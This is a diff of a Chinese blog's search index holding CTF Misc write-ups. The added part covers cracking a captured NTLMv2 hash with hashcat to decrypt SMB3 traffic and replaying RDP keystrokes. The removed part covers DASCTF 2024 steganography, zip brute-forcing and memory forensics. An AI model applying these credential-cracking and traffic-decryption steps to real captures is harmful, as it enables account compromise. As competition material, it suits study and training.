+<p><a class="link"   href="https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password" >https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password<i class="fas fa-external-link-alt"></i></a></p>
+<p>使用tshark导出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -n -r 谍影重重5.0.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160039118.png"
+                        alt="image-20241106160039118"
+                 ></p>
+<p>手动修改为hashcat支持的格式<code>tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000</code></p>
+<p>写入<code>hash.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000&quot;</span> &gt; hash.txt</span><br></pre></td></tr></table></figure>
+<p>然后使用hashcat进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt --show</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160642565.png"
+                        alt="image-20241106160642565"
+                 ></p>
+<p>获得密码<code>babygirl233</code>，在Wireshark中，编辑 -&gt; 首选项 -&gt; Protocols -&gt; NTLMSSP输入password，即可解密SMB3的加密流量</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161029399.png"
+                        alt="image-20241106161029399"
+                 ></p>
+<p>导出SMB对象可以获得一个<code>flag.7z</code>文件和证书文件<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161114873.png"
+                        alt="image-20241106161114873"
+                 ></p>
+<p>这个是本地RDP证书，需要将证书进行解密</p>
+<blockquote>
+<p><a class="link"   href="https://github.com/GoSecure/pyrdp/tree/main/docs" >https://github.com/GoSecure/pyrdp/tree/main/docs<i class="fas fa-external-link-alt"></i></a><br>
+<a class="link"   href="https://www.haxor.no/en/article/analyzing-captured-rdp-sessions" >https://www.haxor.no/en/article/analyzing-captured-rdp-sessions<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>猜测证书是使用猕猴桃导出的（猕猴桃导出的默认密码是<code>mimikatz</code>）使用该密码解密TLS成功，解密后进行PDU导出，过滤器选择<code>OSI Layer 7</code>，导出后选择<code>.pcap文件</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrdp-convert -o output 1.pcap</span><br></pre></td></tr></table></figure>
+<p>转换为pyrdp可读的文件，然后加载<code>pyrdp-player</code>，提取pyrdp文件</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;Return pressed&gt;</span><br><span class="line">&lt;Return released&gt;the</span><br><span class="line">&lt;Shift pressed&gt;</span><br><span class="line">&lt;Shift released&gt;</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;7z</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;password</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;is</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;f&#x27;</span><br><span class="line">&lt;Shift pressed&gt;&#123;</span><br><span class="line">&lt;Shift released&gt;windows</span><br><span class="line">&lt;Shift pressed&gt;_</span><br><span class="line">&lt;Shift released&gt;password</span><br><span class="line">&lt;Shift pressed&gt;&#125;</span><br><span class="line">&lt;Shift released&gt;9347013182&#x27;</span><br><span class="line">&lt;Control pressed&gt;s</span><br><span class="line">&lt;Control released&gt;</span><br><span class="line"></span><br><span class="line"># the 7z password is f&#x27;&#123;windows_password&#125;9347013182&#x27;</span><br></pre></td></tr></table></figure>
+<p>得到解压密码是<code>babygirl2339347013182</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106162323513.png"
+                        alt="image-20241106162323513"
+                 ></p>
 ]]></content>
       <categories>
         <category>题解</category>
@@ -1172,235 +1041,6 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
                         alt="image-20241109135146219"
                  ></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_idcard</span>(<span class="params">idcard</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(idcard) != <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    weights = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">    check_codes = <span class="string">&quot;10X98765432&quot;</span></span><br><span class="line">    idcard_body = idcard[:-<span class="number">1</span>]</span><br><span class="line">    idcard_check_digit = idcard[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算校验码</span></span><br><span class="line">    total = <span class="built_in">sum</span>(<span class="built_in">int</span>(num) * weight <span class="keyword">for</span> num, weight <span class="keyword">in</span> <span class="built_in">zip</span>(idcard_body, weights))</span><br><span class="line">    remainder = total % <span class="number">11</span></span><br><span class="line">    expected_check_digit = check_codes[remainder]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> idcard_check_digit.upper() == expected_check_digit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    valid_prefixes = [</span><br><span class="line">        <span class="string">&quot;734&quot;</span>, <span class="string">&quot;735&quot;</span>, <span class="string">&quot;736&quot;</span>, <span class="string">&quot;737&quot;</span>, <span class="string">&quot;738&quot;</span>, <span class="string">&quot;739&quot;</span>, <span class="string">&quot;747&quot;</span>, <span class="string">&quot;748&quot;</span>, <span class="string">&quot;750&quot;</span>, <span class="string">&quot;751&quot;</span>, <span class="string">&quot;752&quot;</span>, <span class="string">&quot;757&quot;</span>, <span class="string">&quot;758&quot;</span>, <span class="string">&quot;759&quot;</span>, <span class="string">&quot;772&quot;</span>, <span class="string">&quot;778&quot;</span>,</span><br><span class="line">        <span class="string">&quot;782&quot;</span>, <span class="string">&quot;783&quot;</span>, <span class="string">&quot;784&quot;</span>, <span class="string">&quot;787&quot;</span>, <span class="string">&quot;788&quot;</span>, <span class="string">&quot;795&quot;</span>, <span class="string">&quot;798&quot;</span>, <span class="string">&quot;730&quot;</span>, <span class="string">&quot;731&quot;</span>, <span class="string">&quot;732&quot;</span>, <span class="string">&quot;740&quot;</span>, <span class="string">&quot;745&quot;</span>, <span class="string">&quot;746&quot;</span>, <span class="string">&quot;755&quot;</span>, <span class="string">&quot;756&quot;</span>, <span class="string">&quot;766&quot;</span>,</span><br><span class="line">        <span class="string">&quot;767&quot;</span>, <span class="string">&quot;771&quot;</span>, <span class="string">&quot;775&quot;</span>, <span class="string">&quot;776&quot;</span>, <span class="string">&quot;785&quot;</span>, <span class="string">&quot;786&quot;</span>, <span class="string">&quot;796&quot;</span>, <span class="string">&quot;733&quot;</span>, <span class="string">&quot;749&quot;</span>, <span class="string">&quot;753&quot;</span>, <span class="string">&quot;773&quot;</span>, <span class="string">&quot;774&quot;</span>, <span class="string">&quot;777&quot;</span>, <span class="string">&quot;780&quot;</span>, <span class="string">&quot;781&quot;</span>, <span class="string">&quot;789&quot;</span>,</span><br><span class="line">        <span class="string">&quot;790&quot;</span>, <span class="string">&quot;791&quot;</span>, <span class="string">&quot;793&quot;</span>, <span class="string">&quot;799&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(phone) == <span class="number">11</span> <span class="keyword">and</span> phone[:<span class="number">3</span>] <span class="keyword">in</span> valid_prefixes:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> ip.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        <span class="comment"># if len(str(int(_))) != len(_):</span></span><br><span class="line">        <span class="comment">#     return False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ( <span class="number">0</span> &lt;= <span class="built_in">int</span>(_) &lt;= <span class="number">255</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;pppdd.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;category,value\n&quot;</span></span><br><span class="line"></span><br><span class="line">ip_r = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>)</span><br><span class="line">idcard1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;18&#125;&quot;</span>)</span><br><span class="line">idcard2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line">idcard12 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;17&#125;[xX]&quot;</span>)</span><br><span class="line">idcard2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line">idcard22 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;3&#125;[xX]&quot;</span>)</span><br><span class="line">phone1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;11&#125;&quot;</span>)</span><br><span class="line">phone2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;3&#125;[ -]\d&#123;4&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">mpx = &#123;&#125;</span><br><span class="line"></span><br><span class="line">result3 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    dt = binascii.unhexlify(line.strip()).decode()</span><br><span class="line">    <span class="comment"># result3 += dt + &quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    idcards = idcard1.findall(dt) + idcard2.findall(dt) + idcard12.findall(dt) + idcard22.findall(dt)</span><br><span class="line">    phones = phone1.findall(dt) + phone2.findall(dt)</span><br><span class="line">    ips = ip_r.findall(dt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> idcards:</span><br><span class="line">        idcard = _.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> validate_idcard(idcard):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[<span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span>] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> phones:</span><br><span class="line">        <span class="built_in">print</span>(_)</span><br><span class="line">        phone = _.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> validate_phone(phone):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[<span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span>] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">if</span> check_ip(_):</span><br><span class="line">            <span class="keyword">if</span> _ <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[_] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;ip,<span class="subst">&#123;_&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&quot;unhex.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;).write(result3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;result2.csv&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).write(result)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DASCTF 2024暑期挑战赛 Misc部分WP</title>
-    <url>//post/DASCTF2407/</url>
-    <content><![CDATA[<h3 id="png-master">png_master</h3>
-<p><a class="link"   href="https://zh.wikipedia.org/wiki/PNG" >PNG文件结构-维基百科<i class="fas fa-external-link-alt"></i></a></p>
-<ul>
-<li><code>IDAT</code>块是储存图像数据的块，在这个块中存放在图像真正的数据信息，IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块</li>
-<li>完整的图像数据由一个单独的<code>zlib datastream</code>表示，它储存在一个<code>IDAT</code>块中</li>
-<li>一个png文件中无论有多少个<code>IDAT</code>区块，在<code>IDAT</code>块中只会出现一个<code>zlib</code>块</li>
-<li><code>789C</code>在png文件中为<code>zlib</code>的标志位</li>
-<li>一个<code>zlib</code>数据块只有一个标志位，即只会出现一次<code>789C</code></li>
-</ul>
-<p>flag第一段藏在png文件末尾，base64解码后获得<code>DASCTF&#123;2fd9e9ff-e27</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-24-09.png"
-                        alt="Clip_2024-07-23_14-24-09"
-                 ></p>
-<p>binwalk和zsteg都会提示png后有额外块，也可以使用<code>pngcheck -v</code>检查每个IDAT块是否有错误</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-34-41.png"
-                        alt="Clip_2024-07-23_14-34-41"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-35-03.png"
-                        alt="Clip_2024-07-23_14-35-03"
-                 ></p>
-<p>在010中把有问题的IDAT块复制，找一张png图片，取其文件头尾，将IDAT块复制出，作为一张新的图片，但因为宽高不知，用Puzzle Solver进行宽高爆破，得到宽高是500*500，获得flag   <code>a19131f86216&#125;</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/500X500_2_3_8.png"
-                        alt="500X500_2_3_8"
-                 ></p>
-<p>StegSlove中可以看到Alpha通道有东西</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-25-34.png"
-                        alt="Clip_2024-07-23_15-25-34"
-                 ></p>
-<p>尝试后可以找到中间段flag  <code>d-5405-c5f5-</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-26-38.png"
-                        alt="Clip_2024-07-23_15-26-38"
-                 ></p>
-<h3 id="EZ-zip">EZ_zip</h3>
-<p><a class="link"   href="https://hello-ctf.com/HC_MISC/Archivefile/#zip" >压缩包文件结构<i class="fas fa-external-link-alt"></i></a></p>
-<p>直接解压会报错，010打开模板报错，发现解压文件长度不对，可以看到<code>320.zip</code>长度应该为7（文件长度要加后缀长度），修改为7，要将文件头和目录区长度都修改</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-47-29.png"
-                        alt="Clip_2024-07-23_15-47-29"
-                 ></p>
-<p>解压后提示CRC校验错误，参照着DirEntry改动record段，可以发现是解压方法被改成了store，跟压缩方法对不上，修改解压方式</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-58-20.png"
-                        alt="Clip_2024-07-23_15-58-20"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-23.png"
-                        alt="Clip_2024-07-23_16-00-23"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-36.png"
-                        alt="Clip_2024-07-23_16-00-36"
-                 ></p>
-<p>修改后可以正常进行解压得到<code>320.zip</code>，查看压缩文件注释可以得到密码的提示<code>just a byte</code>，密码为一个字节，可以使用python进行爆破。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<p>解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-03-17.png"
-                        alt="Clip_2024-07-23_16-03-17"
-                 ></p>
-<p>联想到前面解压密码是字节形式，通过打印解压密码发现</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            key += password</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key[::-<span class="number">1</span>].<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
-<p><code>c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11</code></p>
-<p>是循环的一个64位字符，将其当作key解密AES得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-04-42.png"
-                        alt="Clip_2024-07-23_16-04-42"
-                 ></p>
-<h3 id="ServerMeM">ServerMeM</h3>
-<p>题面信息如下</p>
-<blockquote>
-<p>公司的服务器遭受了黑客的攻击，经过勘察黑客为维持权限留下了后门，我们获取到了服务器的内存文件，请你分析黑客留下的痕迹</p>
-</blockquote>
-<p>下载附件并解压得到：out.lime、System.map</p>
-<p>在WSL中用以下命令搜索一下得到Linux内核的版本号，因此很明显就是Linux内存取证了</p>
-<blockquote>
-<p>strings mem | grep -i ‘Linux version’ | uniq</p>
-</blockquote>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923181948954.png"
-                        alt="image-20240923181948954"
-                 ></p>
-<p>本题提供两种解法，第一种是常规的通过制作Linux的符号文件来进行取证，另一种就是直接分析内存中的可疑文件</p>
-<h4 id="解法一">解法一</h4>
-<p>Linux内核版本信息如下：</p>
-<blockquote>
-<p>Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Sun May 26 03:37:06 EDT 2024</p>
-</blockquote>
-<h4 id="解法二">解法二</h4>
-<p>直接在strings的结果中搜索 ”.tar.gz” 后缀的文件，发现有一个S3rCr3t.tar.gz</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182121568.png"
-                        alt="image-20240923182121568"
-                 ></p>
-<p>知道了文件名后直接在010中搜索，得到了openssl AES加密后的密文（以Salted开头）</p>
-<p>还有openssl的具体版本：1.0.2k</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182211807.png"
-                        alt="image-20240923182211807"
-                 ></p>
-<p>用CyberChef提取，注意后面的注释不要一起提取出来</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/11111111.png"
-                        alt="11111111"
-                 ></p>
-<p>继续往下查看，可以找到 openssl 加密的密钥：P@ssW0rdddd</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182320920.png"
-                        alt="image-20240923182320920"
-                 ></p>
-<p>然后只要安装openssl-1.0.2-k，使用得到的密钥解密即可</p>
-<p>具体安装步骤如下，编译完成后openssl可执行文件在apps目录下</p>
-<blockquote>
-<p>wget <a class="link"   href="https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz" >https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
-<p>tar -xzvf openssl-1.0.2k.tar.gz</p>
-<p>cd openssl-1.0.2k.tar.gz</p>
-<p>./config --prefix=/usr/</p>
-<p>make</p>
-</blockquote>
-<p>使用以下命令解密即可得到flag：DASCTF{c086cd55-b86a-4ee6-8933-c8bee578148a}</p>
-<blockquote>
-<p>./openssl-1.0.2k/apps/openssl enc -d -aes256 -in download.bin -out flag.tar.gz -k P@ssW0rdddd</p>
-</blockquote>
-<h3 id="ez-wav">ez_wav</h3>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240711.png"
-                        alt="das240711"
-                 ></p>
-<p>打开key.grc</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240712.png"
-                        alt="das240712"
-                 ></p>
-<p>可知key文件经过如上流程变成look.txt文件。我们需要根据这个流程逆回key文件</p>
-<blockquote>
-<p>信号源——》xor-&gt;数据类型转换-&gt;相乘一个常数-&gt;写入</p>
-<p>下面的Vector Source提供的一个脉冲信号</p>
-</blockquote>
-<p>exp如下</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/04e83e72-8324-40b3-8d14-0cf50565178e.png"
-                        alt="04e83e72-8324-40b3-8d14-0cf50565178e"
-                 ></p>
-<p>010打开后得到密码 good_job</p>
-<p>打开flag.grc</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/2fba9b78-9356-4852-aa1a-8aadee4dee85.png"
-                        alt="2fba9b78-9356-4852-aa1a-8aadee4dee85"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/8209f61b-1618-48de-8084-75189f5b1fa8.png"
-                        alt="8209f61b-1618-48de-8084-75189f5b1fa8"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4bda376f-8a5f-450b-88b4-357a057b85e2.png"
-                        alt="4bda376f-8a5f-450b-88b4-357a057b85e2"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
